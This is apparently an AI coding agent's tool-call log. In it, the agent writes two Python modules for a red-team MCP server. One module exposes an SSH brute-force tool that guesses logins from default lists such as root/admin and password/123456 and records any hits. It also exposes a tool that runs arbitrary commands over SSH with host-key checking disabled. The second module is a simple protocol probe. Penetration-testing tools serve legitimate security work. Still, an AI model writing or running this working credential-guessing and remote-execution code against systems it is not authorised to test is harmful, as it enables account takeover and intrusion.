loop 15 | Tool=Write, Args={"file_path":"/home/silimon/mcp-auto/claude_code/mcp_server/990087225_skjortan23_read-team-mcp-server/src/red_team_mcp/ssh_scanner.py","content":"\"\"\"\nSSH Scanner Module - Red Team MCP\n\nStub module providing SSH tools registration for the FastMCP server.\n\"\"\"\nimport asyncio\nimport json\nimport subprocess\nfrom typing import Annotated\n\nfrom red_team_mcp import database\n\n\ndef register_tools(app):\n    \"\"\"Register SSH tools with the FastMCP app.\"\"\"\n\n    @app.tool()\n    async def ssh_execute(\n        host: Annotated[str, \"Target host IP address or hostname\"],\n        port: Annotated[int, \"SSH port number (default: 22)\"] = 22,\n        username: Annotated[str, \"Username for SSH authentication\"] = \"root\",\n        password: Annotated[str, \"Password for SSH authentication\"] = \"\",\n        command: Annotated[str, \"Command to execute on the remote host\"] = \"whoami\",\n    ) -> str:\n        \"\"\"\n        Execute a command on a remote host via SSH with username/password authentication.\n\n        This tool connects to a remote host using SSH and executes the specified command.\n\n        Examples:\n        - Basic command: host='192.168.1.100', username='root', password='pass', command='id'\n        - Custom port: host='10.0.0.1', port=2222, username='admin', password='admin', command='uname -a'\n        \"\"\"\n        try:\n            result = subprocess.run(\n                [\"sshpass\", \"-p\", password, \"ssh\", \"-o\", \"StrictHostKeyChecking=no\",\n                 \"-o\", \"ConnectTimeout=10\", \"-p\", str(port),\n                 f\"{username}@{host}\", command],\n                capture_output=True, text=True, timeout=30\n            )\n            output = {\n                \"success\": result.returncode == 0,\n                \"stdout\": result.stdout,\n                \"stderr\": result.stderr,\n                \"return_code\": result.returncode,\n            }\n            database.save_scan_result_entry(\n                scan_id=\"ssh-exec\", hostname=host, ip_address=host, port=port,\n                protocol=\"tcp\", state=\"open\", service=\"ssh-command\",\n                version=f\"SSH ({username})\", banner=result.stdout, agent=\"ssh-agent\"\n            )\n            return json.dumps(output)\n        except FileNotFoundError:\n            return json.dumps({\"success\": False, \"error\": \"sshpass not installed\"})\n        except Exception as e:\n            return json.dumps({\"success\": False, \"error\": str(e)})\n\n    @app.tool()\n    async def ssh_brute_force(\n        host: Annotated[str, \"Target host IP address or hostname\"],\n        port: Annotated[int, \"SSH port number (default: 22)\"] = 22,\n        usernames: Annotated[str, \"Comma-separated list of usernames to try\"] = \"root,admin,user\",\n        passwords: Annotated[str, \"Comma-separated list of passwords to try\"] = \"password,123456,admin\",\n    ) -> str:\n        \"\"\"\n        Brute force SSH credentials by trying combinations of usernames and passwords.\n\n        This tool attempts to authenticate to the target SSH server using various\n        username/password combinations.\n\n        Examples:\n        - Default list: host='192.168.1.100'\n        - Custom: host='10.0.0.1', usernames='root,admin', passwords='password,letmein'\n        \"\"\"\n        found_credentials = []\n        username_list = [u.strip() for u in usernames.split(\",\")]\n        password_list = [p.strip() for p in passwords.split(\",\")]\n\n        for username in username_list:\n            for password in password_list:\n                try:\n                    result = subprocess.run(\n                        [\"sshpass\", \"-p\", password, \"ssh\", \"-o\", \"StrictHostKeyChecking=no\",\n                         \"-o\", \"ConnectTimeout=5\", \"-o\", \"BatchMode=yes\",\n                         \"-p\", str(port), f\"{username}@{host}\", \"echo success\"],\n                        capture_output=True, text=True, timeout=15\n                    )\n                    if \"success\" in result.stdout:\n                        found_credentials.append({\n                            \"username\": username, \"password\": password,\n                            \"host\": host, \"port\": port\n                        })\n                        database.save_scan_result_entry(\n                            scan_id=\"ssh-brute\", hostname=host, ip_address=host, port=port,\n                            protocol=\"tcp\", state=\"open\", service=\"ssh-credentials\",\n                            version=f\"SSH ({username}:{password})\", banner=\"Credentials found\", agent=\"ssh-agent\"\n                        )\n                except Exception:\n                    continue\n\n        return json.dumps({\n            \"success\": len(found_credentials) > 0,\n            \"credentials_found\": found_credentials,\n            \"attempts\": len(username_list) * len(password_list)\n        })\n"} ; Tool=Write, Args={"file_path":"/home/silimon/mcp-auto/claude_code/mcp_server/990087225_skjortan23_read-team-mcp-server/src/red_team_mcp/protocol_detector.py","content":"\"\"\"\nProtocol Detector Module - Red Team MCP\n\nStub module for detecting protocols on target hosts.\n\"\"\"\nimport socket\nfrom typing import Tuple\n\n\ndef detect_protocol(host: str, port: int, timeout: int = 5) -> str:\n    \"\"\"Detect the protocol running on a host:port.\n\n    Returns one of: 'http', 'https', 'ftp', 'ssh', 'dns', 'tcp', 'udp'\n    \"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(timeout)\n        sock.connect((host, port))\n\n        # Send HTTP probe\n        sock.sendall(b\"GET / HTTP/1.0\\r\\n\\r\\n\")\n        response = sock.recv(256).decode(\"utf-8\", errors=\"ignore\")\n        sock.close()\n\n        if response.startswith(\"HTTP/\") or \"Server:\" in response:\n            return \"http\"\n    except Exception:\n        pass\n    return \"tcp\"\n"}
